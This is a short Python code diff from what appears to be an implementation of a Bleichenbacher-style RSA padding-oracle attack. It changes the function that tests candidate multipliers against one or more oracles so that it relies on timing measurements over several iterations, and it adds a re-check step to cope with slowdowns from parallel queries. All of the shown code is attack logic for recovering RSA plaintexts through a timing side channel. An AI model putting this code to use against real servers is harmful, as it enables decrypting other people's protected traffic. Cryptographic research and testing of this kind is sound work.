@@ -105,14 +105,30 @@ def blinding(k, key, c, oracle):
             return s_0, c_0
 
 def s_c_conform(key, c, s, oracles, k):
+    iterations = 5
     queries = []
     for i, oracle in enumerate(oracles):
-        queries.append(oracle.query_async(((c * pow(s + i, key.e, key.n)) % key.n).to_bytes(k, byteorder='big')))
+        queries.append(oracle.query_timing_stage2_async(((c * pow(s + i, key.e, key.n)) % key.n).to_bytes(k, byteorder='big'), iterations))
         next(queries[-1])  # send frame
+    #send all iterations
+    for j in range(iterations - 1):
+        for i in range(len(oracles)):
+            next(queries[i]) 
+            
     retval = -1
     for i, query in enumerate(queries):
         if next(query) and retval == -1:  # recv result
             retval = s + i
+
+    # this is required because when 1 querry takes a long time all querries 
+    # within the paralleilaztion window will also take a long time
+    if retval != -1:
+        for i in range(len(oracles)):
+            res = oracles[0].query_timing_stage1(((c * pow(s + i, key.e, key.n)) % key.n).to_bytes(k, byteorder='big'))
+            if res:
+                retval = s + i
+
+
     return retval
 
 
